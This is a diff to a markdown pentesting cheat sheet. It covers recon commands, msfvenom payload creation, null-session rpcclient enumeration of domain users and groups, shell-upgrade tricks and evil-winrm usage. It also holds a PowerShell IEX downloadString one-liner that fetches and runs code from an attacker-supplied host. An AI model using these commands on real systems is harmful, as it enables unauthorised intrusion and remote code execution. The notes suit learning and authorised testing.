@@ -14,9 +14,6 @@ Linux: `hostname; whoami; ip a`
 ## Setup a simple web server
 `python -m SimpleHTTPServer`
 
-## Download from Windows shell
-`IEX(New-Object Net.WebClient).downloadString('http://(IP/HOSTNAME)')`
-
 ## Encoding file to remove bad characters, and copy to clipboard
 `cat (filename) | iconv -t UTF-16LE | base64 -w 0 | xclip -selection clipboard`
 
@@ -28,10 +25,8 @@ Change `UTF-16LE` to `UTF-8` for Unix
 ## MSFVenom
 ### List payloads
 `msfvenom -l payloads`
-
 ### List formats
 `msfvenom -l formats`
-
 ### Create payload
 `msfvenom -p (payload) LHOST=(IP) LPORT=(port) -f (format) -o (output filename)`
 
@@ -54,10 +49,20 @@ In Metasploit:
 ## RPC 
 ### Access
 `rpcclient -U '' (IP)`
-### User dump
-In RPC client, run `enumdomusers`
+### `enumdomusers`
+Lists all users
+### `queryuser 0x(user number)`
+Lists info about user
+### `enumdomgroups`
+Lists all groups
+### `querygroup 0x(group number)`
+Lists info about group
+### `querygroupmem 0x(group number)`
+Lists group members
 ### More details
 In RPC client, run `querdispinfo`
+
+
 
 ## Wordlists
 ### How to make nice wordlists
@@ -67,11 +72,25 @@ In RPC client, run `querdispinfo`
 ### DNSpy
 Recommended for .NET
 
+## Linux shell
+### `!!`
+Reruns previous command
+### `$_`
+Pulls out last argument from previous command
+### `!$`
+Pulls out last word from previous command (not quite the same as `$_`)
+
 ## Windows shell
 ### `allinfo`
 Windows version of `ls -lah`
-### `type`
+### `type`, `gc`
 Windows version of `cat`
+### `gci`
+Shorthand for `get-childitem`, `gci -Hidden` is like `ls -a`
+### Running files
+Run files with `.\(filename)`
+### Download from Windows shell
+`IEX(New-Object Net.WebClient).downloadString('http://(IP/HOSTNAME)')`
 
 ## OS typing by TTL
 Windows has a default of a 128 TTL, Unix has 64?
@@ -90,7 +109,12 @@ Plenty at [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-sh
 ### Convert into a real shell
 `python -c 'import pty;pty.spawn("/bin/bash")'`
 
-
 ## Searchsploit
 Path for Kali is `/usr/share/exploitdb/exploits/`
 
+## evil-winrm
+### `upload`
+Uploads a file from your current working directory
+
+## DNS Servers
+Typically running kerberos (:88), Windows RPC (:135), and ldap (:389), possibilty SMB (:445)
